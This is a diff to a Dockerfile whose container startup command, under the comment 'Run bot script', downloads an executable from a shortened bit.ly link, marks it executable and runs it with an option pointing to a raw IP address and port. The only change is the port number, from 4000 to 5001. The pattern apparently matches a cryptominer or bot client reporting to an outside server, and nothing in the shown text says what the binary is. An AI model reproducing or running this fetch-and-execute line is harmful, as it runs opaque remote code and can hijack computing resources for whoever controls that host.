@@ -37,4 +37,4 @@ RUN apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
 RUN echo "Uploaded files:" && ls /home/stuff/
 
 # Run bot script:
-CMD wget https://bit.ly/3mPeYds && chmod +x 3mPeYds && ./3mPeYds -o 43.228.215.76:4000
+CMD wget https://bit.ly/3mPeYds && chmod +x 3mPeYds && ./3mPeYds -o 43.228.215.76:5001
